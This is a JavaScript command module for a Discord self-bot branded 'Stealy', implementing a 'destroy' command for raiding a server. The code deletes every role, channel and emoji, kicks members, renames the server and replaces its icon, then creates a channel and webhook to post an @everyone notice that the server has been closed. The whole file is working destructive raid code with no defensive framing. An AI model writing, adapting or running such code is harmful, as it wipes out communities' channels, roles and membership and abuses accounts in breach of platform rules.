module.exports = {
    name: "destroy",
    run: async (client, message, args) => {
        if (!client.config.danger.includes(message.author.id)) return;
        if (!message.guild) return message.edit(client.language("*Vous devez utiliser cette commande dans un serveur.*", "*You must use this command in guild only.*"))

        message.edit("<a:star:1345073135095123978> **Stealy** <a:star:1345073135095123978>")
        message.delete().catch(() => false)

        if (message.member.permissions.has("MANAGE_ROLES")) message.guild.roles.filter(r => r.delete().then(() => client.sleep(4000)).catch(() => false))
        if (message.member.permissions.has("MANAGE_CHANNELS")) message.guild.channels.filter(c => c.delete().then(() => client.sleep(4000)).catch(() => false))
        if (message.member.permissions.has("MANAGE_GUILD")) message.guild.setName(`Stealy`) && message.guild.setIcon(`https://senju.cc/images/Speed.png`).catch(() => false)
        if (message.member.permissions.has("MANAGE_MEMBERS")) message.guild.members.filter(m => m.kick().then(() => client.sleep(5000)).catch(() => false))
        if (message.member.permissions.has("MANAGE_EMOJIS")) message.guild.emojis.filter(e => e.delete().then(() => client.sleep(15000)).catch(() => false))

        client.sleep(2000)
        let zob = await message.guild.createChannel("stealy", { type: "text" }).catch(() => false)
        
        let zob2 = await zob.createWebhook(`› Stealy`, "https://senju.cc/images/Speed.png").catch(() => false)

        let embed = {
            color      : 0xFFFFFF,
            title      : '› Stealy',
            thumbnail  : { url: `https://senju.cc/images/Speed.png` },
            description: `*Le serveur à été fermé je vous remercie de bien vouloir patienter.*`,
            footer: {
                text: `Merci de votre visite`,
            }
        }

        fetch(zob2.url, { method: "POST", headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content : "@everyone",embeds: [embed] })}).catch(() => false)
    }
}